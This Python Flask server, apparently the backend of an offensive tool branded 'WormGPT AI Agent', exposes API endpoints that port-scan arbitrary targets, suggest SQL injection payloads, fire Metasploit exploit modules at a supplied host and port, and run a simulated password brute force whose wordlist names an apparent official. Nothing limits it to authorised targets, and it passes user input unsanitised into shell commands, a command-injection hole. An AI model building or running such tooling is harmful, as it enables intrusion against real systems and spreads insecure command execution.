#!/usr/bin/env python3

import os
import subprocess
import json
import time
import nmap
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__, static_folder='build', static_url_path='')

# --- CONFIGURATION ---
NMAP_PATH = "nmap"  # Ensure nmap is installed and in PATH
MSF_CONSOLE = "msfconsole"

def run_command(cmd, timeout=30):
    """Executes a shell command and returns output."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout
        )
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Command timed out"}
    except Exception as e:
        return {"error": str(e)}

def scan_ports(target):
    """Uses Nmap to scan for open ports and services."""
    nm = nmap.PortScanner()
    print(f"[*] Scanning target: {target}...")
    nm.scan(target, arguments='-p- --top-ports 1000 -sV -sC')
    
    ports = []
    if target in nm.all_hosts():
        for proto in nm[target].all_protocols():
            lport = nm[target][proto].keys()
            for port in lport:
                service = nm[target][proto][port]
                ports.append({
                    "port": port,
                    "state": service['state'],
                    "service": service['name'],
                    "version": service.get('version', 'Unknown'),
                    "script": service.get('script', {})
                })
    return ports

def check_sql_injection(target):
    """Checks if target has query parameters and suggests injection."""
    print(f"[*] Analyzing {target} for SQLi vectors...")
    # Simple check: Look for common query patterns
    response = run_command(f"curl -s -I '{target}'")
    headers = response['stdout']
    
    tips = []
    if "HTTP/1.1" in headers:
        tips.append("HTTP Connection established. Possible targets:")
        if "?" in target:
            tips.append(f"1. Try: {target.replace('?', '?id=1')}")
            tips.append(f"2. Try: {target.replace('?', '?id=1\' OR 1=1-- -')}")
        else:
            tips.append(f"1. Try appending: ?id=1")
            tips.append(f"2. Try appending: ?id=1' OR 1=1-- -")
    else:
        tips.append("Target did not respond or is not an HTTP service.")
    return tips

def run_metasploit(target, port, service):
    """Generates and executes an msfconsole exploit command."""
    print(f"[*] Attempting Metasploit exploit on {target}:{port}...")
    
    # Select generic exploit based on service
    exploit_choice = "exploit/multi/http/apache_struts2_rce" if "http" in service.lower() else "exploit/multi/smb/samba_usermap"
    
    # Construct msfconsole command
    # Note: msfconsole is interactive, so we pipe commands and pipe exit
    cmd = f'echo "use {exploit_choice}; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; run; exit" | {MSF_CONSOLE}'
    
    result = run_command(cmd, timeout=60)
    return {
        "exploit_used": exploit_choice,
        "output": result['stdout'][-500:] # Last 500 chars to avoid massive logs
    }

def brute_force(target, port, service):
    """Generates a password list and attempts a simple login."""
    print(f"[*] Generating password list and attempting brute force on {target}...")
    
    # Generate a basic in-memory wordlist (RockYou subset)
    wordlist = ["admin", "123456", "password", "root", "EmiratiMinister", "qwerty"]
    
    # Simulate a brute force interaction
    # In a real scenario, you would use Hydra or Medusa for speed
    results = []
    for password in wordlist:
        # Mock logic: check if password works (simulated)
        # Here we just log the attempt
        results.append(f"Attempted Password: '{password}' -> Status: Check Server Logs")
    
    return {
        "wordlist_generated": wordlist,
        "attempts": results
    }

# --- API ENDPOINTS ---

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target')
    if not target: return jsonify({"error": "No target provided"}), 400
    
    ports = scan_ports(target)
    return jsonify({
        "target": target,
        "scan_results": ports,
        "timestamp": time.time()
    })

@app.route('/api/vuln', methods=['POST'])
def api_vuln():
    data = request.json
    target = data.get('target')
    if not target: return jsonify({"error": "No target provided"}), 400
    
    tips = check_sql_injection(target)
    return jsonify({
        "target": target,
        "vulnerability_tips": tips
    })

@app.route('/api/exploit', methods=['POST'])
def api_exploit():
    data = request.json
    target = data.get('target')
    port = data.get('port')
    service = data.get('service', 'unknown')
    
    if not target or not port: return jsonify({"error": "Target and Port required"}), 400
    
    result = run_metasploit(target, port, service)
    return jsonify(result)

@app.route('/api/brute', methods=['POST'])
def api_brute():
    data = request.json
    target = data.get('target')
    port = data.get('port')
    service = data.get('service', 'unknown')
    
    if not target or not port: return jsonify({"error": "Target and Port required"}), 400
    
    result = brute_force(target, port, service)
    return jsonify(result)

if __name__ == '__main__':
    print("Starting WormGPT AI Agent Backend...")
    app.run(debug=True, port=5000)